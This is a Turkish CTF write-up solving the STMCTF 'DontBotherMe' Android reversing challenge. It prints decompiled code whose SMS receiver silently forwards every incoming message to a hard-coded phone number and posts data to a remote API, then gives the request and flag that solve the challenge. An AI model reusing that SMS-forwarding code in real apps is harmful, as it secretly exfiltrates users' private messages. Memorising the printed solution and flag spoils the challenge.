---
author: Adem Furkan Özcan
pubDatetime: 2019-09-29T20:28:00.000+03:00
modDatetime: 
title: STMCTF DontBotherMe
featured: false
draft: false
language: tr
tags:
  - STMCTF
  - Writeup
  - mobile
  - DontBotherMe
  - android
description: STMCTF DontBotherMe Sorusu Çözümü
---

Bu yazımda STMCTF'deki Reverse kategorisinde bulunan DontBotherMe sorusunun çözümünü anlatacağım.

Öncelikle açıklamayı okumayı unutmayın.

## Dikkat!!! Önemli Açıklama

CTF'lerde mobil sorularını çözerken [jadx-gui](https://github.com/skylot/jadx) kullanın benim gibi jd-gui kullanma hatasına düşmeyin. Sırf bu yüzden soruyu ctf bittikten sonra çözdüm.

## Hazırsan Başlayalım

Apk dosyasını [buradan](../assets/download/sms.apk) indirebilirsiniz.

Şimdi jadx-gui'yi açıp apk dosyamızı seçelim. Sonrasında MainActivity'e girip kodlara bir bakalım.

```java
package com.example.android_sms;

import android.app.PendingIntent;
import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.telephony.SmsManager;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;

public class MainActivity extends AppCompatActivity {
    String mMessage;

    /* access modifiers changed from: protected */
    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        setContentView((int) R.layout.activity_main);
        Button button = (Button) findViewById(R.id.button);
        final SmsManager smsManager = SmsManager.getDefault();
        AnonymousClass1 r0 = new OnClickListener(null, null, null) {
            final /* synthetic */ PendingIntent val$sentIntent;

            {
                this.val$sentIntent = r4;
            }

            public void onClick(View view) {
                smsManager.sendTextMessage("1923", null, counter.flag, this.val$sentIntent, null);
            }
        };
        button.setOnClickListener(r0);
    }
}
```

## İpuçları Önemli

```bash
smsManager.sendTextMessage("1923", null, counter.flag, this.val$sentIntent, null);
```
Butona tıkladığımızda 1923'e mesaj atıyor. 1923'ü bir kenara not alalım. Şimdi MySmsReciever'in içindeki kodlara bakalım.

```java
package com.example.android_sms;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build.VERSION;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;
import android.widget.Toast;
import java.io.IOException;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request.Builder;
import okhttp3.RequestBody;
import okhttp3.Response;
import org.json.JSONException;
import org.json.JSONObject;

public class MySmsReceiver extends BroadcastReceiver {
    private static final String TAG = MySmsReceiver.class.getSimpleName();
    public static final String pdu_type = "pdus";

    public void onReceive(Context context, Intent intent) {
        Bundle extras = intent.getExtras();
        String string = extras.getString("format");
        SmsManager smsManager = SmsManager.getDefault();
        Object[] objArr = (Object[]) extras.get(pdu_type);
        if (objArr != null) {
            boolean z = VERSION.SDK_INT >= 23;
            SmsMessage[] smsMessageArr = new SmsMessage[objArr.length];
            String str = BuildConfig.FLAVOR;
            int i = 0;
            while (i < smsMessageArr.length) {
                if (z) {
                    smsMessageArr[i] = SmsMessage.createFromPdu((byte[]) objArr[i], string);
                } else {
                    smsMessageArr[i] = SmsMessage.createFromPdu((byte[]) objArr[i]);
                }
                StringBuilder sb = new StringBuilder();
                sb.append(str);
                sb.append("SMS from ");
                sb.append(smsMessageArr[i].getOriginatingAddress());
                String sb2 = sb.toString();
                StringBuilder sb3 = new StringBuilder();
                sb3.append(sb2);
                sb3.append(" :");
                sb3.append(smsMessageArr[i].getMessageBody());
                sb3.append("\n");
                String sb4 = sb3.toString();
                counter.message = smsMessageArr[i].getOriginatingAddress();
                counter.number = smsMessageArr[i].getMessageBody();
                smsManager.sendTextMessage("05557754509", null, sb4, null, null);
                try {
                    postRequest();
                } catch (IOException e) {
                    e.printStackTrace();
                }
                if (smsMessageArr[i].getMessageBody().equals("flag") && smsMessageArr[i].getOriginatingAddress().equals("1453")) {
                    counter.counter_x++;
                    Toast.makeText(context, String.valueOf(counter.counter_x), 1).show();
                }
                i++;
                str = sb4;
            }
        }
    }

    public void postRequest() throws IOException {
        String str = "application/json";
        MediaType parse = MediaType.parse(str);
        OkHttpClient okHttpClient = new OkHttpClient();
        JSONObject jSONObject = new JSONObject();
        try {
            jSONObject.put("message", counter.message);
            jSONObject.put("number", counter.number);
            jSONObject.put("counter", String.valueOf(counter.counter_x));
        } catch (JSONException e) {
            e.printStackTrace();
        }
        okHttpClient.newCall(new Builder().url("https://erici05hu8.execute-api.eu-west-1.amazonaws.com/production").post(RequestBody.create(parse, jSONObject.toString())).header("Accept", str).header("Content-Type", str).build()).enqueue(new Callback() {
            public void onFailure(Call call, IOException iOException) {
                Log.w("failure Response", iOException.getMessage().toString());
            }

            public void onResponse(Call call, Response response) throws IOException {
                StringBuilder sb = new StringBuilder();
                sb.append(counter.flag);
                sb.append(response.body().string());
                counter.flag = sb.toString();
            }
        });
    }
}
```

İlk dikkatimizi çeken `postRequest` kısmı ama ondan öncesinde counter.message ve counter.number'ın

```bash
counter.message = smsMessageArr[i].getOriginatingAddress();
counter.number = smsMessageArr[i].getMessageBody();
```

şu kodda ters çevrildiğini görüyoruz. Sonrasında da if bloğunun içindeki

```bash
smsMessageArr[i].getMessageBody().equals("flag") && smsMessageArr[i].getOriginatingAddress().equals("1453")
```

şu kısım dikkatimizi çekiyor. Demek ki messagebody flag'e eşit olacak ve mesaj 1453'ten gelecek. Dikkat etmemiz gereken bir şey var üstte counter.message sms'in geldiği numaraya, counter.number messageBody'e eşitlenmiş.

Yani counter.name ve counter.number'ın son değeri alttaki gibi oluyor.

```bash
counter.message = "1453";
counter.number = "flag";
```

Şimdi postRequest kısmına geri dönüp koda bir bakalım.

```java

public void postRequest() throws IOException {
    String str = "application/json";
    MediaType parse = MediaType.parse(str);
    OkHttpClient okHttpClient = new OkHttpClient();
    JSONObject jSONObject = new JSONObject();
    try {
        jSONObject.put("message", counter.message);
        jSONObject.put("number", counter.number);
        jSONObject.put("counter", String.valueOf(counter.counter_x));
    } catch (JSONException e) {
        e.printStackTrace();
    }
    okHttpClient.newCall(new Builder().url("https://erici05hu8.execute-api.eu-west-1.amazonaws.com/production").post(RequestBody.create(parse, jSONObject.toString())).header("Accept", str).header("Content-Type", str).build()).enqueue(new Callback() {
        public void onFailure(Call call, IOException iOException) {
            Log.w("failure Response", iOException.getMessage().toString());
        }

        public void onResponse(Call call, Response response) throws IOException {
            StringBuilder sb = new StringBuilder();
            sb.append(counter.flag);
            sb.append(response.body().string());
            counter.flag = sb.toString();
        }
    });
}
```

Koda bakıyoruz ve bizim için şurası önemli

```java
jSONObject.put("message", counter.message);
jSONObject.put("number", counter.number);
jSONObject.put("counter", String.valueOf(counter.counter_x));

okHttpClient.newCall(new Builder().url("https://erici05hu8.execute-api.eu-west-1.amazonaws.com/production").post(
RequestBody.create(parse, jSONObject.toString())).header("Accept", str).header("Content-Type", str).build())
```

Post işlemini [bu linke](https://erici05hu8.execute-api.eu-west-1.amazonaws.com/production) yapacağımızı öğrendik.

counter.message ve counter.number ı bulmuştuk ve elimizde 1923 vardı. counter.counter_x değeri için counter classına bakalım

```java
static int counter_x = 0;
static String flag = "STMCTF{F4K3_FL4G}";
```

Sahte flagı ve counter_x'in 0 olduğunu gördük ve elimizdeki post isteği alttaki gibi oldu.

```js
{
	"message" : "1453",
	"number" : "flag",
	"counter": "0"
}
```

## Haydi Post Edelim

Şimdi isterseniz terminal üzerinden isterseniz program aracılığıyla isteği post etmek kaldı.

İsteğimizi alttaki gibi yapalım ve response'a bakalım

```js
{
	"message" : "1453",
	"number" : "flag",
	"counter": "0"
}

```

`Not Yet` diye bir response döndü. Hatırlarsanız elimizde 1923 sayısı vardı birde onunla post etmeyi deneyelim

```js
{
	"message" : "1453",
	"number" : "flag",
	"counter": "1923"
}
```

```bash
STMCTF{Bu_Memleket_Tarihte_Turktu_Simdide_Turktur_ve_Oyle_Kalacaktir}
```

Vee `response` olarak flag döndü (:

## Son

Yazımı okuduğunuz için teşekkür ediyorum.